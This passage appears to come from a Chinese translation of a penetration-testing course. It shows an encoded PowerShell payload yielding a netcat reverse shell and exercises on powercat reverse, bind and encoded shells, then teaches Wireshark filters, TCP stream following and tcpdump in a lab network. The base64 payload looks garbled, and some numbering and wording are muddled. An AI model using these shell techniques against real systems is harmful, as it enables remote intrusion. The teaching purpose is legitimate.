
```
PS C:\Users\offsec> powershell.exe -E ZgB6AGAY8BAG4ABBUCAAW0B8AHIAZQAH8AGMAMQ8AFMBAZ0BAHUAKAIwIGBCAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIAACAKAHIA
```

在运行了标准和编码载荷后，Alice 在她的监听器上收到了反向 shell：

```
kali@kali:~$ nc -lvnp 443

listening on (any) 443

connect to 10.11.0.4
```

列表 123 - 获取编码标准反向 shell

我们涵盖了可以处理文件、绑定 shell 和反向 shell 的各种工具。这些工具在渗透测试期间具有各种功能、弱性和适用性。

## 4.3.81 练习

- 使用 PowerShell 和 `powercat` 在 Windows 系统上创建反向 shell。
- 使用 PowerShell 和 `powercat` 在 Windows 系统上创建绑定 shell。
- 使用 PowerShell 和 `powercat` 在 Windows 系统上创建编码 shell。

## 4.4 Wireshark

一名合格的渗透测试人员应该精通网络基础。作为行业标准的网络嗅器，Wireshark 是学习网络协议、分析网络流量和调试服务的必备工具。在本节中，我们将讨论 Wireshark 的基础知识。

### 4.4.1 Wireshark 基础

Wireshark 使用 `Libpcap`^101（Linux）或 `Winpcap`^102（Windows）库来捕获网络包。

在使用嗅器分析网络流量时，很容易被收集到的数据量所淹没。为了方便分析，我们可以在 Wireshark 中应用捕获过滤器^103 和显示过滤器^104。在 Wireshark 会话期间，不匹配的包将被丢弃，剩余数据将传递给捕获引擎。捕获引擎随后对包进行解析、分析，并在显示输出之前应用任何显示过滤器。

### 4.4.2 启动 Wireshark

在下面的示例中，我们将捕捉匿名 FTP 登录期间的网络流量。在我们的 Kali 系统上，我们可以如列表 125 所示使用命令行或通过应用程序菜单（位于“嗅探与伪装”子菜单下）启动 Wireshark。

```
kali@kali:~ sudo wireshark
```

列表 125 - 从终端运行 wireshark

### 4.4.3 捕获过滤器

当 Wireshark 加载时，我们会看到一个基础窗口，可以在其中设置要监控的网络接口和显示过滤器。如前所述，我们可以通过丢弃任何不匹配过滤器的流量来减少捕获的流量，并将注意力集中在想要分析的包上。请注意，任何被捕获过滤器排除的流量都会丢失，因此如果你担心可能丢失数据，最好定义较宽的捕获过滤器。

我们首先选择想要监控的接口并输入捕获过滤器。在这种情况下，我们使用 `net` 过滤器^105 仅捕获 `10.11.1.0/24` 地址范围内的流量：

# 攻击性安全

使用 Kali Linux 2.0 进行渗透测试

Wireshark 网络分析器

图 12：为 `tap0` 设置捕获过滤器

也可以通过导航到 Capture（捕获）> Capture filters（捕获过滤器）从预定义的过滤器中选择，点击 + 号添加自己的捕获过滤器。使用捕获过滤器，我们可以从可用接口列表中双击网络接口 (`tap0`) 来开始捕获。

## 4.4.4 显示过滤器

现在 Wireshark 正在捕获本地网络上的所有流量，我们可以登录 FTP 服务器并检查流量：

```
kali@kali:~$ ftp 10.11.1.13

Connected to 10.11.1.13.

220 Microsoft FTP Service

Name (10.11.1.13:kali): anonymous

331 Anonymous access allowed, send identity (e-mail name) as password.

Password anonymous

230 Anonymous user logged in.

Remote system type is Windows_NT.

tp quit
```

图 126 - 在 FTP 服务器中记录过滤器

为了进一步缩小背景流量，让我们利用显示过滤器（display filter）来仅关注 FTP 协议。显示过滤器比捕获过滤器灵活得多，语法也略有不同。顾名名义，显示过滤器过滤的是正在显示的包，而 Wireshark 在后台继续捕获 `10.11.1.0/24` 地址范围的所有网络流量。因此，可以通过点击显示过滤器右侧的“X”图标来清除过滤器，而无需重启捕获（图 13）。对于捕获过滤器，我们也可以通过 Analyze（分析）> Display filters（显示过滤器）从预定义列表中选择过滤器。

让我们应用一个仅显示 FTP 数据或端口 21 上 TCP 流量的显示过滤器：

图 13：为端口 21 的所有流量设置过滤器

该过滤器效果良好。现在我们只能看到端口 21 FTP 流量。

## 4.4 跟踪 TCP 流

Wireshark 允许我们查看网络流量，包括每个包的内容。然而，我们通常对数据流更感兴趣，以便重组会话并各种格式显示。我们可以使用特定的 TCP 流，可以右键点击感兴趣的数据包（例如我们 FTP 会话包含的包），然后选择 Follow（跟踪）> TCP Stream：

图 14：在 Wireshark 中跟踪 TCP 流

重组后的 TCP 流更易读，我们可以回顾与 FTP 服务器的交互。因为 FTP 是明文协议，我们可以看到 FTP 客户端输出和接收到的内容：

### 4.4.5.1 练习

1. 使用 Wireshark 在尝试通过 Netcat 连接到端口 110 的 `10.11.1.217` 时捕获网络活动，然后尝试登录。
2. 读取并理解输出。三次握手发生在哪里？连接何时关闭的？
3. 跟踪 TCP 流以读取登录尝试。
4. 使用显示过滤器仅监控端口 110 的流量。
5. 运行新会话，这次使用捕获过滤器仅收集端口 110 的流量。

## 4.5 Tcpdump

`Tcpdump` 是一个基于文本的网络嗅探器，尽管缺乏图形界面，但它非常精简、强大且灵活。它是目前为止最常用的命令行数据包分析工具，可以在大多数 Unix 和 Linux 系统上找到，但缺乏捕获网络流量的用户权限。

`Tcpdump` 可以从网络捕获流量并读取现有的捕获文件。让我们看看在防火墙上捕获的 `password_cracking_filtered.pcap` 文件中什么。下载文件并跟随我们分析数据。首先，我们将使用 `sudo` 启动 `tcpdump`（赋予权限）并使用 `-r` 打开文件：

> 106 (`Tcpdump & Libcap`, 2019), http://www.tcpdump.org/
> 107 (Offensive Security, 2019), https://www.offensive-security.com/pwk-online/password_cracking_filtered.pcap

```
kali@kali:~ sudo tcpdump -r password_cracking_filtered.pcap
```
